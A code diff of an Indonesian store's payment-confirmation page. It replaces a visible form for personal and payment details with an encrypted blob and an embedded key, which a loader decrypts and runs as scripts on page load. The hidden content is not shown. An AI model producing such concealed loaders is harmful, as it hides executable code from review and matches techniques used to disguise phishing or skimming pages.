@@ -1,6 +1,7 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
+    <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Konfirmasi - DigitalStore</title>
@@ -118,134 +119,297 @@
             margin-top: 15px;
         }
     </style>
+
+
+    <!-- Auto-decryption system -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Auto-decrypted HTML page">
+    <style>
+        /* Loading animation */
+        #loadingOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loader {
+            text-align: center;
+            color: white;
+        }
+        
+        .spinner {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid #ffffff;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loader h2 {
+            margin-bottom: 10px;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        .loader p {
+            opacity: 0.8;
+            font-size: 14px;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        /* Error styling */
+        .error-container {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 10px;
+            margin-top: 20px;
+            color: #ff6b6b;
+        }
+        
+        .success-indicator {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #4CAF50;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-size: 12px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            z-index: 10000;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <div class="logo">
-                <i class="fas fa-check-circle"></i>
-            </div>
-            <h1>Konfirmasi Pembayaran</h1>
-            <p>Silakan lengkapi data dan upload bukti transfer</p>
-        </header>
-        
-        <form class="confirmation-form" id="confirmationForm">
-            <div class="form-group">
-                <label for="name">Nama Lengkap</label>
-                <input type="text" id="name" required placeholder="Masukkan nama lengkap">
-            </div>
-            
-            <div class="form-group">
-                <label for="phone">Nomor WhatsApp</label>
-                <input type="tel" id="phone" required placeholder="081234567890">
-            </div>
-            
-            <div class="form-group">
-                <label for="email">Email</label>
-                <input type="email" id="email" required placeholder="email@contoh.com">
-            </div>
-            
-            <div class="form-group">
-                <label for="paymentMethod">Metode Pembayaran</label>
-                <select id="paymentMethod" required>
-                    <option value="">Pilih metode</option>
-                    <option value="DANA">DANA</option>
-                    <option value="GOPAY">GOPAY</option>
-                    <option value="SEABANK">SEABANK</option>
-                    <option value="BANK JAGO">BANK JAGO</option>
-                </select>
-            </div>
-            
-            <div class="form-group">
-                <label>Upload Bukti Transfer</label>
-                <div class="upload-area" onclick="document.getElementById('proof').click()">
-                    <i class="fas fa-cloud-upload-alt" style="font-size: 3rem; color: var(--accent); margin-bottom: 15px;"></i>
-                    <p>Klik untuk upload bukti transfer</p>
-                    <p id="fileName" style="color: #94a3b8; margin-top: 10px;">Format: JPG, PNG, PDF (Maks. 5MB)</p>
-                </div>
-                <input type="file" id="proof" accept="image/*,.pdf" style="display: none;" onchange="showFileName(this)">
-            </div>
-            
-            <div class="form-group">
-                <label for="notes">Catatan (Opsional)</label>
-                <textarea id="notes" placeholder="Tambahkan catatan jika diperlukan..."></textarea>
-            </div>
-            
-            <button type="submit" class="submit-btn">
-                <i class="fas fa-paper-plane"></i> Kirim Konfirmasi
-            </button>
-            
-            <button type="button" class="back-btn" onclick="window.location.href='payment.html'">
-                <i class="fas fa-arrow-left"></i> Kembali ke Pembayaran
-            </button>
-        </form>
+    <!-- Loading overlay -->
+    <div id="loadingOverlay">
+        <div class="loader">
+            <div class="spinner"></div>
+            <h2>Memuat Halaman</h2>
+            <p>Mendekripsi konten...</p>
+        </div>
     </div>
     
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <!-- Error message container -->
+    <div id="errorContainer" class="error-container">
+        <h3>⚠️ Terjadi Kesalahan</h3>
+        <p id="errorMessage">Gagal memuat halaman. Silakan refresh.</p>
+        <button onclick="location.reload()" style="
+            background: #2575fc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        ">Refresh Halaman</button>
+    </div>
+    
+    <!-- Main content will be inserted here -->
+    <div id="mainContent"></div>
+    
+    <!-- Success indicator -->
+    <div id="successIndicator" class="success-indicator">
+        <i class="fas fa-check"></i> Halaman berhasil dimuat
+    </div>
+    
+    <!-- Include CryptoJS from CDN -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
+    <!-- Encrypted data and decryption logic -->
     <script>
-        document.getElementById('confirmationForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const name = document.getElementById('name').value;
-            const phone = document.getElementById('phone').value;
-            const email = document.getElementById('email').value;
-            const paymentMethod = document.getElementById('paymentMethod').value;
-            const proof = document.getElementById('proof').files[0];
-            
-            if (!name || !phone || !email || !paymentMethod || !proof) {
-                Swal.fire({
-                    icon: 'warning',
-                    title: 'Data Belum Lengkap',
-                    text: 'Harap lengkapi semua data dan upload bukti transfer.',
-                    confirmButtonColor: '#d4af37'
-                });
-                return;
-            }
-            
-            // Simpan data konfirmasi
-            const confirmationData = {
-                name,
-                phone,
-                email,
-                paymentMethod,
-                timestamp: new Date().toISOString()
-            };
-            
-            localStorage.setItem('confirmation_data', JSON.stringify(confirmationData));
-            
-            Swal.fire({
-                icon: 'success',
-                title: 'Konfirmasi Terkirim!',
-                text: 'Data pembayaran Anda telah dikirim.',
-                confirmButtonColor: '#d4af37'
-            }).then(() => {
-                // Redirect ke halaman admin
-                window.location.href = 'admin.html';
-            });
-        });
+        // Encrypted content (AES-256-CBC)
+        const encryptedData = "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";
         
-        function showFileName(input) {
-            const fileName = document.getElementById('fileName');
-            if (input.files.length > 0) {
-                fileName.textContent = input.files[0].name;
-                fileName.style.color = 'var(--accent)';
-            } else {
-                fileName.textContent = 'Format: JPG, PNG, PDF (Maks. 5MB)';
-                fileName.style.color = '#94a3b8';
+        // Auto-decryption key (embedded)
+        const autoDecryptKey = "YmFzZTY0YmFzZTY0YmFzZTY0YmFzZTY0YmFzZTY0YmE=";
+        
+        // Function to decrypt the content
+        function decryptContent() {
+            try {
+                // Convert base64 to CryptoJS format
+                const encryptedBytes = CryptoJS.enc.Base64.parse(encryptedData);
+                
+                // Extract IV (first 16 bytes = 4 words)
+                const iv = CryptoJS.lib.WordArray.create(encryptedBytes.words.slice(0, 4));
+                
+                // Extract ciphertext (rest of the data)
+                const ciphertext = CryptoJS.lib.WordArray.create(encryptedBytes.words.slice(4));
+                
+                // Parse the key
+                const key = CryptoJS.enc.Base64.parse(autoDecryptKey);
+                
+                // Decrypt using AES-CBC
+                const decrypted = CryptoJS.AES.decrypt(
+                    { ciphertext: ciphertext },
+                    key,
+                    { 
+                        iv: iv,
+                        mode: CryptoJS.mode.CBC,
+                        padding: CryptoJS.pad.Pkcs7
+                    }
+                );
+                
+                // Convert to UTF-8 string
+                const decryptedText = decrypted.toString(CryptoJS.enc.Utf8);
+                
+                if (!decryptedText) {
+                    throw new Error("Decryption failed - invalid key or data");
+                }
+                
+                return decryptedText;
+                
+            } catch (error) {
+                console.error("Decryption error:", error);
+                throw error;
             }
         }
         
-        // Load saved data jika ada
-        document.addEventListener('DOMContentLoaded', function() {
-            const savedData = localStorage.getItem('confirmation_data');
-            if (savedData) {
-                const data = JSON.parse(savedData);
-                document.getElementById('name').value = data.name || '';
-                document.getElementById('phone').value = data.phone || '';
-                document.getElementById('email').value = data.email || '';
-                document.getElementById('paymentMethod').value = data.paymentMethod || '';
+        // Function to display the content
+        function displayContent(content) {
+            const mainContent = document.getElementById('mainContent');
+            mainContent.innerHTML = content;
+            
+            // Execute any scripts in the content
+            const scripts = mainContent.getElementsByTagName('script');
+            for (let script of scripts) {
+                const newScript = document.createElement('script');
+                if (script.src) {
+                    newScript.src = script.src;
+                } else {
+                    newScript.textContent = script.textContent;
+                }
+                document.head.appendChild(newScript);
             }
-        });
+            
+            // Fix relative paths for images, links, etc.
+            fixRelativePaths();
+        }
+        
+        // Function to fix relative paths
+        function fixRelativePaths() {
+            // Get current URL path
+            const basePath = window.location.pathname.split('/').slice(0, -1).join('/') + '/';
+            
+            // Fix img src
+            document.querySelectorAll('img[src^="./"], img[src^="../"]').forEach(img => {
+                if (img.src.startsWith('./')) {
+                    img.src = basePath + img.getAttribute('src').substring(2);
+                } else if (img.src.startsWith('../')) {
+                    img.src = window.location.origin + img.getAttribute('src');
+                }
+            });
+            
+            // Fix link href
+            document.querySelectorAll('a[href^="./"], a[href^="../"]').forEach(link => {
+                const href = link.getAttribute('href');
+                if (href.startsWith('./')) {
+                    link.href = basePath + href.substring(2);
+                } else if (href.startsWith('../')) {
+                    link.href = new URL(href, window.location.origin).href;
+                }
+            });
+            
+            // Fix script src
+            document.querySelectorAll('script[src^="./"], script[src^="../"]').forEach(script => {
+                const src = script.getAttribute('src');
+                if (src && src.startsWith('./')) {
+                    script.src = basePath + src.substring(2);
+                }
+            });
+        }
+        
+        // Function to show success indicator
+        function showSuccess() {
+            const indicator = document.getElementById('successIndicator');
+            indicator.style.opacity = '1';
+            setTimeout(() => {
+                indicator.style.opacity = '0';
+            }, 3000);
+        }
+        
+        // Function to show error
+        function showError(message) {
+            document.getElementById('errorMessage').textContent = message;
+            document.getElementById('errorContainer').style.display = 'block';
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+        
+        // Main initialization function
+        async function initializePage() {
+            try {
+                console.log("🔐 Starting auto-decryption...");
+                
+                // Add small delay for visual feedback
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                // Decrypt content
+                const decryptedHTML = decryptContent();
+                
+                // Display content
+                displayContent(decryptedHTML);
+                
+                // Hide loading overlay
+                document.getElementById('loadingOverlay').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('loadingOverlay').classList.add('hidden');
+                }, 500);
+                
+                // Show success indicator
+                showSuccess();
+                
+                // Dispatch event that content is loaded
+                window.dispatchEvent(new Event('decryptedContentLoaded'));
+                
+                console.log("✅ Page decrypted and loaded successfully");
+                
+            } catch (error) {
+                console.error("❌ Failed to load page:", error);
+                showError("Gagal memuat halaman: " + error.message);
+            }
+        }
+        
+        // Start when page loads
+        document.addEventListener('DOMContentLoaded', initializePage);
+        
+        // Fallback: if still loading after 10 seconds, show error
+        setTimeout(() => {
+            if (!document.getElementById('loadingOverlay').classList.contains('hidden')) {
+                showError("Waktu muat habis. Silakan refresh halaman.");
+            }
+        }, 10000);
+        
+        // Add service worker for offline support (optional)
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('/sw.js').catch(err => {
+                    console.log('ServiceWorker registration failed: ', err);
+                });
+            });
+        }
     </script>
+    
+    <!-- Font Awesome for icons -->
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
 </body>
 </html>
